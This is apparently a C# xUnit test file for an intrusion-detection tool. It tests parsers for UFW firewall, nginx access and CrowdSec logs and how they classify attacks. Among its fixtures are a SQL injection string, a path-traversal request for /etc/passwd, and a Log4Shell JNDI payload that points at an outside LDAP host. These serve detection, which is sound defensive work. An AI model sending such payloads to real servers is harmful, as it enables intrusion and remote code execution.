using XrCopilotLab.Intrusion.Mcp.Core.Analysis;
using XrCopilotLab.Intrusion.Mcp.Core.Models;
using XrCopilotLab.Intrusion.Mcp.Core.Parsing;
using Xunit;

namespace XrCopilotLab.Intrusion.Mcp.Core.Tests;

public class UfwLogParserTests
{
    private static readonly TimeZoneInfo Rome = TimeZoneInfo.FindSystemTimeZoneById("Europe/Rome");
    private static readonly DateTimeOffset Now = new(2026, 11, 10, 12, 0, 0, TimeSpan.FromHours(1));

    [Fact]
    public void Reads_a_blocked_tcp_connection()
    {
        const string line = "2026-11-10T00:31:02.118204+01:00 bastion-01 kernel: [812345.123456] [UFW BLOCK] IN=eth0 OUT= MAC=00:16:3e:5a:01:02 SRC=198.51.100.213 DST=10.30.0.15 LEN=44 TOS=0x00 PREC=0x00 TTL=242 ID=54321 PROTO=TCP SPT=40112 DPT=502 WINDOW=1024 RES=0x00 SYN URGP=0";
        Assert.True(UfwLogParser.TryParse(line, Rome, Now, out var e));
        Assert.Equal((LogEventKind.FirewallBlock, "198.51.100.213", 502, "TCP"), (e!.Kind, e.SourceIp, e.TargetPort, e.Protocol));
    }

    [Fact]
    public void Reads_the_classic_format_and_udp()
    {
        const string line = "Nov 10 00:31:02 bastion-01 kernel: [812345.123456] [UFW BLOCK] IN=eth0 OUT= SRC=203.0.113.9 DST=10.30.0.15 LEN=44 PROTO=UDP SPT=5000 DPT=47808 LEN=24";
        Assert.True(UfwLogParser.TryParse(line, Rome, Now, out var e));
        Assert.Equal((47808, "UDP"), (e!.TargetPort, e.Protocol));
    }

    [Theory]
    [InlineData("2026-11-10T00:31:02+01:00 h kernel: [1.0] [UFW ALLOW] IN=eth0 OUT= SRC=203.0.113.9 DST=10.30.0.15 PROTO=TCP SPT=5000 DPT=22")]
    [InlineData("2026-11-10T00:31:02+01:00 h kernel: [1.0] [UFW AUDIT] IN=eth0 OUT= SRC=203.0.113.9 DST=10.30.0.15 PROTO=TCP SPT=5000 DPT=22")]
    [InlineData("2026-11-10T00:31:02+01:00 h sshd[1]: [UFW BLOCK] SRC=203.0.113.9 PROTO=TCP DPT=22")]
    public void Ignores_what_is_not_a_block_by_the_kernel(string line) =>
        Assert.False(UfwLogParser.TryParse(line, Rome, Now, out _));
}

public class NginxAccessLogParserTests
{
    [Theory]
    [InlineData("/.env", 404, "curl/8.5.0", "env-file", AttackType.WebVulnerabilityScan)]
    [InlineData("/wp-login.php", 404, "Mozilla/5.0", "wordpress", AttackType.WebVulnerabilityScan)]
    [InlineData("/index.php?id=1%27%20UNION%20SELECT%20a,b%20FROM%20users--", 400, "python-requests/2.31.0", "sql-injection", AttackType.WebExploitAttempt)]
    [InlineData("/static/..%2f..%2fetc/passwd", 400, "-", "path-traversal", AttackType.WebExploitAttempt)]
    [InlineData("/?x=%24%7Bjndi:ldap://198.51.100.250:1389/a%7D", 404, "-", "log4shell", AttackType.WebExploitAttempt)]
    [InlineData("/", 200, "Mozilla/5.0 zgrab/0.x", "scanner-agent", AttackType.WebVulnerabilityScan)]
    [InlineData("/admin/", 401, "Mozilla/5.0", "auth-failure", AttackType.WebLoginBruteForce)]
    [InlineData("/login", 429, "Mozilla/5.0", "rate-limited", AttackType.RequestFlood)]
    public void Keeps_the_requests_that_match_an_attack(string path, int status, string agent, string rule, AttackType type)
    {
        var line = $"203.0.113.7 - - [10/Nov/2026:03:12:45 +0100] \"GET {path} HTTP/1.1\" {status} 162 \"-\" \"{agent}\"";
        Assert.True(NginxAccessLogParser.TryParse(line, out var e));
        Assert.Equal((rule, status, "203.0.113.7"), (e!.Rule, e.Status, e.SourceIp));
        Assert.Equal(type, WebProbeRules.TypeOf(e.Rule!));
        Assert.Equal(new DateTimeOffset(2026, 11, 10, 3, 12, 45, TimeSpan.FromHours(1)), e.Time);
    }

    [Theory]
    [InlineData("198.51.100.9 - - [10/Nov/2026:09:00:00 +0100] \"GET /dashboard HTTP/1.1\" 200 5120 \"-\" \"Mozilla/5.0 (Windows NT 10.0)\"")]
    [InlineData("198.51.100.150 - - [10/Nov/2026:09:00:00 +0100] \"GET /robots.txt HTTP/1.1\" 200 51 \"-\" \"Mozilla/5.0 (compatible; Googlebot/2.1)\"")]
    [InlineData("not a log line")]
    public void Skips_ordinary_traffic(string line) =>
        Assert.False(NginxAccessLogParser.TryParse(line, out _));
}

public class CrowdsecLogParserTests
{
    [Fact]
    public void Reads_an_alert()
    {
        const string line = "time=\"2026-11-10T01:25:13+01:00\" level=info msg=\"Ip 198.51.100.213 performed 'crowdsecurity/ssh-slow-bf' (11 events over 31m2s) at 2026-11-10 00:25:13.48 +0000 UTC\"";
        Assert.True(CrowdsecLogParser.TryParse(line, out var e));
        Assert.Equal((LogEventKind.CrowdsecAlert, "198.51.100.213", "crowdsecurity/ssh-slow-bf", "11 events over 31m2s"), (e!.Kind, e.SourceIp, e.Rule, e.Detail));
        Assert.Equal(AttackType.SshBruteForce, AttackCatalog.FromScenario(e.Rule!));
    }

    [Fact]
    public void Reads_a_decision()
    {
        const string line = "time=\"2026-11-10T01:25:13+01:00\" level=info msg=\"(5ac0d2f1e8a94c4a/crowdsec) crowdsecurity/ssh-slow-bf by ip 198.51.100.213 (MD/64499) : 4h ban on Ip 198.51.100.213\"";
        Assert.True(CrowdsecLogParser.TryParse(line, out var e));
        Assert.Equal((LogEventKind.CrowdsecDecision, "4h ban"), (e!.Kind, e.Detail));
    }

    [Theory]
    [InlineData("crowdsecurity/iptables-scan-multi_ports", AttackType.PortScan)]
    [InlineData("crowdsecurity/http-sqli-probing", AttackType.WebExploitAttempt)]
    [InlineData("crowdsecurity/apache_log4j2_cve-2021-44228", AttackType.WebExploitAttempt)]
    [InlineData("crowdsecurity/http-probing", AttackType.WebVulnerabilityScan)]
    [InlineData("crowdsecurity/http-sensitive-files", AttackType.WebVulnerabilityScan)]
    [InlineData("crowdsecurity/http-generic-bf", AttackType.WebLoginBruteForce)]
    [InlineData("crowdsecurity/something-new", AttackType.Other)]
    public void Maps_scenarios_to_attack_types(string scenario, AttackType type) =>
        Assert.Equal(type, AttackCatalog.FromScenario(scenario));

    [Theory]
    [InlineData("time=\"2026-11-10T01:25:13+01:00\" level=info msg=\"Starting processing data\"")]
    [InlineData("time=\"2026-11-10T01:25:13+01:00\" level=warning msg=\"failed to fetch hub index\"")]
    public void Ignores_service_lines(string line) =>
        Assert.False(CrowdsecLogParser.TryParse(line, out _));
}
